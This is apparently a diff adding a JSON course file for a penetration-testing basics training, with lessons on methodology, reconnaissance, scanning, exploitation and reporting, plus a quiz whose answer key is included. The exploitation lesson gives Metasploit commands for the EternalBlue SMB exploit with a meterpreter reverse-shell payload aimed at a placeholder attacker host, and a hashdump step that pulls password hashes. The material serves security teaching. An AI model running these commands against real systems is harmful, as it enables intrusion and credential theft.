@@ -1,0 +1,29 @@
+{
+  "id": 5,
+  "title": "Penetration Testing Basics",
+  "duration": "6 hours",
+  "modules": [
+    {"id": 1, "title": "Introduction to Penetration Testing", "duration": "40 min", "content": "## Penetration Testing Overview\n\nPenetration testing simulates real-world attacks to identify vulnerabilities.\n\n### Types of Pentests\n\n- **Black Box** - No prior knowledge\n- **White Box** - Full access to source code\n- **Gray Box** - Partial information\n\n### Methodology\n\n1. **Planning** - Define scope, rules of engagement\n2. **Reconnaissance** - Gather information\n3. **Scanning** - Identify vulnerabilities\n4. **Exploitation** - Attempt to exploit\n5. **Post-Exploitation** - Maintain access\n6. **Reporting** - Document findings\n\n### Legal Considerations\n\n- Always get written authorization\n- Stay within scope\n- Document everything\n- Report all findings"},
+    {"id": 2, "title": "Reconnaissance & OSINT", "duration": "50 min", "content": "## Information Gathering\n\n### Passive Reconnaissance\n\n```bash\n# WHOIS lookup\nwhois target.com\n\n# DNS enumeration\ndig target.com ANY\nnslookup -type=any target.com\n\n# Subdomain discovery\nsublist3r -d target.com\n```\n\n### OSINT Tools\n\n- **theHarvester** - Email, names, subdomains\n- **Shodan** - Internet-connected devices\n- **Google Dorks** - Advanced search operators\n\n```\nsite:target.com filetype:pdf\nintitle:\"index of\" password\n```\n\n### Active Reconnaissance\n\n```bash\n# Port scanning\nnmap -sV -sC target.com\n\n# Web technology detection\nwhatweb target.com\n```"},
+    {"id": 3, "title": "Vulnerability Scanning", "duration": "45 min", "content": "## Scanning for Vulnerabilities\n\n### Network Scanning with Nmap\n\n```bash\n# Service version detection\nnmap -sV -p- target\n\n# Vulnerability scripts\nnmap --script vuln target\n\n# OS detection\nnmap -O target\n```\n\n### Web Application Scanning\n\n```bash\n# Nikto web scanner\nnikto -h http://target\n\n# Directory bruteforce\ngobuster dir -u http://target -w wordlist.txt\n```\n\n### Vulnerability Scanners\n\n- **Nessus** - Comprehensive scanner\n- **OpenVAS** - Open-source alternative\n- **Qualys** - Cloud-based scanning"},
+    {"id": 4, "title": "Exploitation Techniques", "duration": "50 min", "content": "## Exploitation Basics\n\n### Metasploit Framework\n\n```bash\n# Start Metasploit\nmsfconsole\n\n# Search for exploits\nsearch type:exploit platform:windows smb\n\n# Use exploit\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS target\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST attacker\nexploit\n```\n\n### Common Exploits\n\n- Buffer overflows\n- SQL injection\n- Command injection\n- File inclusion\n\n### Post-Exploitation\n\n```bash\n# Meterpreter commands\ngetuid\nsysinfo\nhashdump\n```"},
+    {"id": 5, "title": "Reporting & Documentation", "duration": "35 min", "content": "## Professional Reporting\n\n### Report Structure\n\n1. **Executive Summary** - High-level overview\n2. **Methodology** - Testing approach\n3. **Findings** - Vulnerabilities discovered\n4. **Risk Ratings** - CVSS scores\n5. **Recommendations** - Remediation steps\n6. **Appendices** - Technical details\n\n### Risk Ratings\n\n| Rating | CVSS Score | Description |\n|--------|------------|-------------|\n| Critical | 9.0-10.0 | Immediate action |\n| High | 7.0-8.9 | Priority fix |\n| Medium | 4.0-6.9 | Plan to fix |\n| Low | 0.1-3.9 | Accept or fix |\n\n### Best Practices\n\n- Clear, concise language\n- Reproducible steps\n- Evidence (screenshots)\n- Business impact"}
+  ],
+  "assessment": {
+    "passing_score": 80,
+    "max_attempts": 3,
+    "retry_delay_hours": 24,
+    "questions": [
+      {"id": 1, "question": "Which pentest type has no prior knowledge of the target?", "options": ["White Box", "Gray Box", "Black Box", "Red Box"], "correct": 2},
+      {"id": 2, "question": "What is the first phase of penetration testing?", "options": ["Scanning", "Exploitation", "Planning", "Reporting"], "correct": 2},
+      {"id": 3, "question": "Which tool is used for vulnerability scanning?", "options": ["Metasploit", "Nessus", "Burp Suite", "John"], "correct": 1},
+      {"id": 4, "question": "What does OSINT stand for?", "options": ["Open Source Intelligence", "Operating System Integration", "Online Security Information", "Offensive Security Internet"], "correct": 0},
+      {"id": 5, "question": "Which Metasploit command searches for exploits?", "options": ["find", "search", "locate", "scan"], "correct": 1},
+      {"id": 6, "question": "What is the CVSS score range for Critical vulnerabilities?", "options": ["0-3.9", "4.0-6.9", "7.0-8.9", "9.0-10.0"], "correct": 3},
+      {"id": 7, "question": "Which phase involves maintaining access?", "options": ["Reconnaissance", "Scanning", "Post-Exploitation", "Planning"], "correct": 2},
+      {"id": 8, "question": "What should always be obtained before pentesting?", "options": ["Root access", "Written authorization", "VPN connection", "Encryption keys"], "correct": 1},
+      {"id": 9, "question": "Which tool discovers subdomains?", "options": ["Metasploit", "Nmap", "Sublist3r", "Hashcat"], "correct": 2},
+      {"id": 10, "question": "What is Meterpreter?", "options": ["Scanner", "Payload", "Exploit", "Wordlist"], "correct": 1}
+    ]
+  }
+}
